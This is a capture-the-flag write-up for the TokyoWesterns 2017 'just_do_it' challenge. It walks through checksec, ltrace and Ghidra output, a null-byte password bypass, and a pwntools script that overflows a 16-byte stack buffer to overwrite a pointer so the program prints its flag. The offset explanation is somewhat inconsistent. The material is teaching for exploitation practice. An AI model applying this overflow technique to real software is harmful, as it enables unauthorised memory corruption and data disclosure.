### Binary Exploitation

### Source: TokyoWesterns17

### Basic File Check

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ chmod +x just_do_it 
                                                                                                                                                                                                                  
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ file just_do_it 
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
                                                                                                                                                                                                                  
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ checksec just_do_it  
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we are dealing with a `x86` binary which is `dynamically linked` and `non-stripped`

Its protection are `NX enabled` meaning we wont be able to inject shellcode on the stack and execute it

Lets run it to know what it does

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./just_do_it 
Welcome my secret service. Do you know the password?
Input the password.
password
Invalid Password, Try Again
```

It asks for password and receives input then exit

I'll run it on ltrace to see if i get anything

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ltrace ./just_do_it
__libc_start_main(0x80485bb, 1, 0xffcca4b4, 0x8048710 <unfinished ...>
setvbuf(0xf7e1d620, 0, 2, 0)                                                                                                      = 0
setvbuf(0xf7e1dda0, 0, 2, 0)                                                                                                      = 0
setvbuf(0xf7e1dd00, 0, 2, 0)                                                                                                      = 0
fopen("flag.txt", "r")                                                                                                            = 0x925a1a0
fgets("FLAG(well_that_w4s_easy_right?}\n"..., 48, 0x925a1a0)                                                                      = 0x804a080
puts("Welcome my secret service. Do yo"...Welcome my secret service. Do you know the password?
)                                                                                       = 53
puts("Input the password."Input the password.
)                                                                                                       = 20
fgets(lol
"lol\n", 32, 0xf7e1d620)                                                                                                    = 0xffcca3c8
strcmp("lol\n", "P@SSW0RD")                                                                                                       = 1
puts("Invalid Password, Try Again!"Invalid Password, Try Again!
)                                                                                              = 29
+++ exited (status 0) +++
```

We see it gives the flag already and also does a string compare with the input to `P@SSW0RD`

But that flag is my test flag if this was a remote server we can't initilize a connection and run ltrace

So lets move on and see what we can do

I'll decompile the binary using ghidra

```
int main(void)

{
  char *_local_EAX_154;
  int password_compare;
  char input [16];
  FILE *flag;
  char *flagHandle;
  undefined *char;
  
  char = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  flagHandle = failed_message;
  flag = fopen("flag.txt","r");
  if (flag == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _local_EAX_154 = fgets(::flag,0x30,flag);
  if (_local_EAX_154 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  _local_EAX_154 = fgets(input,0x20,stdin);
  if (_local_EAX_154 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  password_compare = strcmp(input,PASSWORD);
  if (password_compare == 0) {
    flagHandle = success_message;
  }
  puts(flagHandle);
  return 0;
}
```

Here's what the binary is doing

```
1. It opens up a file called flag.txt 
2. It then asks for a password
3. After the user gives the password it then does a string compare with the value stored in PASSWORD
4. If the password is right it prints the success message
```

Now lets the value used as a string compare

```
                             PASSWORD                                        XREF[2]:     Entry Point(*), main:080486d0(R)  
        0804a03c c8 87 04 08     addr       s_P@SSW0RD_080487c8                              = "P@SSW0RD"
```

So we can see that the string it is checking for is P@SSW0RD

Now since our input is being scanned in through an fgets call, a newline character 0x0a will be appended to the end.

So in order to pass the check we will need to put a null byte after P@SSW0RD

Here's it is 

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ python2 -c "print 'P@SSW0RD' + '\x00'" | ./just_do_it 
Welcome my secret service. Do you know the password?
Input the password.
Correct Password, Welcome!
```

Cool that worked but this is not our main purpose

From the decompiled code we know that our input is stored in a buffer holding up 16bytes of data

Lets get the offset for the input buffer to the flag

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __cdecl main(void)
             int               EAX:4          <RETURN>                                XREF[2]:     08048655(W), 
                                                                                                   080486dd(W)  
             undefined4        EAX:4          _local_EAX_154                          XREF[2]:     08048655(W), 
                                                                                                   080486dd(W)  
             undefined4        EAX:4          password_compare                        XREF[1]:     080486dd(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     080485c2(R)  
             undefined4        Stack[-0xc]:4  char                                    XREF[1]:     08048704(R)  
             undefined4        Stack[-0x14]:4 flagHandle                              XREF[2]:     0804860d(W), 
                                                                                                   080486ee(W)  
             undefined4        Stack[-0x18]:4 flag                                    XREF[3]:     08048625(W), 
                                                                                                   08048628(R), 
                                                                                                   0804864b(R)  
             undefined1[16]    Stack[-0x28]   input                                   XREF[2]:     080486a6(*), 
                                                                                                   080486d9(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:080484d7(*), 0804886c, 
                                                                                          080488c8(*)  
```

Now we see that the offset for the input is `0x28` and that of flag is `0x18`

Therefore the offset from the input to the flag is `0x28 - 0x18 = 0x10` 

So with this offset i can redirect the eip to another function / address

Now the way the flag is being read is this

```
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
  ```
  
  From this we see that it opens up flag.txt then reads 48bytes of data and puts it in the flag variable
  
  With this we can overwrite the return address to call the flag 
  
  But we need to get it
  
  ```
                               flag                                            XREF[2]:     Entry Point(*), main:08048650(*)  
        0804a080 00 00 00        undefine
                 00 00 00 
                 00 00 00 
           0804a080 00              undefined100h                     [0]                               XREF[2]:     Entry Point(*), main:08048650(*)  
           0804a081 00              undefined100h                     [1]
           0804a082 00              undefined100h                     [2]
           0804a083 00              undefined100h                     [3]
           0804a084 00              undefined100h                     [4]
           0804a085 00              undefined100h                     [5]
           0804a086 00              undefined100h                     [6]
           0804a087 00              undefined100h                     [7]
           0804a088 00              undefined100h                     [8]
           0804a089 00              undefined100h                     [9]
           0804a08a 00              undefined100h                     [10]
           0804a08b 00              undefined100h                     [11]
           0804a08c 00              undefined100h                     [12]
           0804a08d 00              undefined100h                     [13]
           0804a08e 00              undefined100h                     [14]
           0804a08f 00              undefined100h                     [15]
           0804a090 00              undefined100h                     [16]
           0804a091 00              undefined100h                     [17]
           0804a092 00              undefined100h                     [18]
           0804a093 00              undefined100h                     [19]
           0804a094 00              undefined100h                     [20]
           0804a095 00              undefined100h                     [21]
           0804a096 00              undefined100h                     [22]
           0804a097 00              undefined100h                     [23]
           0804a098 00              undefined100h                     [24]
           0804a099 00              undefined100h                     [25]
           0804a09a 00              undefined100h                     [26]
           0804a09b 00              undefined100h                     [27]
           0804a09c 00              undefined100h                     [28]
           0804a09d 00              undefined100h                     [29]
           0804a09e 00              undefined100h                     [30]
           0804a09f 00              undefined100h                     [31]
           0804a0a0 00              undefined100h                     [32]
           0804a0a1 00              undefined100h                     [33]
           0804a0a2 00              undefined100h                     [34]
           0804a0a3 00              undefined100h                     [35]
           0804a0a4 00              undefined100h                     [36]
           0804a0a5 00              undefined100h                     [37]
           0804a0a6 00              undefined100h                     [38]
           0804a0a7 00              undefined100h                     [39]
           0804a0a8 00              undefined100h                     [40]
           0804a0a9 00              undefined100h                     [41]
           0804a0aa 00              undefined100h                     [42]
           0804a0ab 00              undefined100h                     [43]
           0804a0ac 00              undefined100h                     [44]
           0804a0ad 00              undefined100h                     [45]
           0804a0ae 00              undefined100h                     [46]
           0804a0af 00              undefined100h                     [47]
```

We see the flag lives in the .bss section of the binary with an address of `0804a080`

There are 20 bytes worth of data from input & flag (0x28 - 0x14 = 0x14)

Now lets create the payload 

Here's my script 

```
from pwn import *

io = process('./just_do_it')

overflow = "0"*20
addr = p32(0x804a080)
payload = overflow + addr
io.send(payload)
io.send('\n')

io.interactive()
```

On running it

```
┌──(venv)─(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ python2 justexploit.py 
[+] Starting local process './just_do_it': pid 138615
[*] Switching to interactive mode
Welcome my secret service. Do you know the password?
Input the password.
FLAG(well_that_w4s_easy_right?}

[*] Process './just_do_it' stopped with exit code 0 (pid 138615)
[*] Got EOF while reading in interactive
$
```

And we're done 





